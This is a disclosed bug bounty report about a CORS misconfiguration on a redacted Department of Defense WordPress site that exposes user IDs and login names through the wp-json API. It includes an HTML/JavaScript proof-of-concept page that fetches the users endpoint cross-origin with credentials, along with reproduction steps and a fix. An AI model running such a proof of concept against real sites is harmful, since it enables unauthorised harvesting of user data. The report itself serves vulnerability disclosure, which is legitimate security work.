# Bypassing CORS Misconfiguration Leads to Sensitive Exposure at https://███/

## Report Details
- **Report ID**: 1092125
- **URL**: https://hackerone.com/reports/1092125
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-02-01T14:20:44.811Z
- **Disclosed**: 2022-04-07T19:53:34.859Z

## Reporter
- **Username**: whoisbinit
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
It's possible to get information about the users registered (such as: id, name, login name, etc.) without authentication in WordPress via API on https://██████████/.

**Description:**
There exists a cross-origin resource sharing (CORS) misconfiguration vulnerability at https://█████/, allowing anyone from any third-party domain to perform two-way interaction with this domain. Generally, CORS policy is used to determine whether the content in a website can interact with another specific website or not and whether the another specific website can directly fetch the content from the original website or not.

CORS policy is implemented in web applications, by whitelisting/allowing company's other assets to fetch dynamic resource from the specific asset, and not allowing the rest of the third-party domains to access or fetch the content. However, the situation is different in case of this vulnerable domain, allowing anyone to fetch the resource.

## Step-by-step Reproduction Instructions
Step 1. Visit https://████/wp-json/, and you will see that it displays user IDs, names, login usernames, etc. without requiring any form of authentication;
Step 2. Now, it is time to craft a Proof-of-Concept exploit for the CORS misconfiguration vulnerability using JavaScript. For this purpose, you may use the following piece of code:

```html
<html>
<body>
<center>
<button onclick="exploitCORS()">Fetch from the target!</button>
<hr size=1 width="80%">
<textarea id="fetchedResource" rows="10" cols="50" style="width:75%" placeholder="Click on the button to fetch resource!"></textarea>
</center>

<script>
function exploitCORS(){
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://████████/wp-json/wp/v2/users/',true);
    req.withCredentials = true;
    req.send();
}

function reqListener(){
    document.getElementById("fetchedResource").value = this.responseText;
}
</script>

</body>
</html>
```

Copy this piece of code, and place in a file with **.html** extension, and visit the file in your web browser!

Step 3. When you are viewing the exploit file in your browser, click on the button available there, and then it will fetch the resource from the target vulnerable website.

## Product, Version, and Configuration (If applicable)
- https://██████████/

## Suggested Mitigation/Remediation Actions
To fix this vulnerability, you can use a whitelist of trusted domains rather than defining a wildcard or programmatically verifying the supplied origins.

## Impact

By taking an advantage of this vulnerability, an attacker would be able to fetch contents from the vulnerable domain despite being in a third-party domain, not in the asset of the vulnerable domain. The contents that the attacker can fetch include the WordPress user IDs, usernames, and other information.

Despite the wp-json API endpoint being a public information by default, there exists CORS misconfiguration in this website, that allows any website to fetch resources from this particular vulnerable domain.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Visit https://█████████/wp-json/wp/v2/users/
2. Use the exploit PoC code mentioned earlier!

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
